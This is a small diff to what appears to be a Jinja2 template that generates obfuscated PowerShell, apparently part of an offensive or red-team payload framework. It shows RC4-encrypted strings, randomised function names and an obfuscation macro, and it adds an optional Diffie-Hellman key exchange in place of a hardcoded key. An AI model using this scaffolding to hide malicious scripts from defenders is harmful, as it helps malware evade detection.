@@ -9,9 +9,14 @@
 
 {%- include "powershell/rc4.ps1" -%}
 
+{% if DH_G %}
+{%- include "powershell/dh_kex.ps1" %}
+{% else %}
 ${{symbol_name("KEY")}} = [System.Text.Encoding]::UTF8.GetBytes("{{key}}");
+{% endif %}
 
 function {{symbol_name("Decrypt-String")}} {[System.Text.Encoding]::UTF8.GetString(({{symbol_name("Decrypt-RC4")}} ([System.Convert]::FromBase64String($args[0])) ${{symbol_name("KEY")}}))};
+
 
 {%- from 'macros.jinja2' import obfuscate with context -%}
 
